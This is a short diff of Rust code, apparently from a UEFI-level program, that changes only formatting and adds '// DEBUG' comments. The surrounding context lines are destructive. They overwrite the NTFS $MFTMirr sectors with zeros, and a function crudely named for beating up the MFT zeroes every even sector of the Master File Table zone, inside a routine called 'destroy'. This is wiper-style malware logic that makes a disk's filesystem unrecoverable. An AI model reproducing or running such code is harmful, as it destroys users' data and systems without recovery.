@@ -36,7 +36,7 @@ fn get_mft_range(blk: &mut BlockIO, media_id: u32, boot_sector: u64, mut buf: &m
 
     // Destroy the $MFTMirr cluster, do it here cause it's only 8 sectors to overwrite
     let buf2 = [0u8; 512];
-    for sector in mft_mir_start..mft_mir_start+8 {
+    for sector in mft_mir_start..mft_mir_start + 8 {
         blk.write_blocks(media_id, sector, &buf2).unwrap_success();
     }
 
@@ -84,13 +84,13 @@ fn get_mft_range(blk: &mut BlockIO, media_id: u32, boot_sector: u64, mut buf: &m
 fn beat_the_shit_out_of_the_mft(blk: &mut BlockIO, media_id: u32, mft_zone: Range<u64>) {
     let buf = [0u8; 512];
 
-    log::info!("Start destroying...");
+    log::info!("Start destroying..."); // DEBUG
     for sector in mft_zone {
         if sector % 2 == 0 {
             blk.write_blocks(media_id, sector, &buf).unwrap_success();
         }
     }
-    log::info!("Finished !");
+    log::info!("Finished !"); // DEBUG
 }
 
 pub fn destroy(st: &SystemTable<Boot>) {
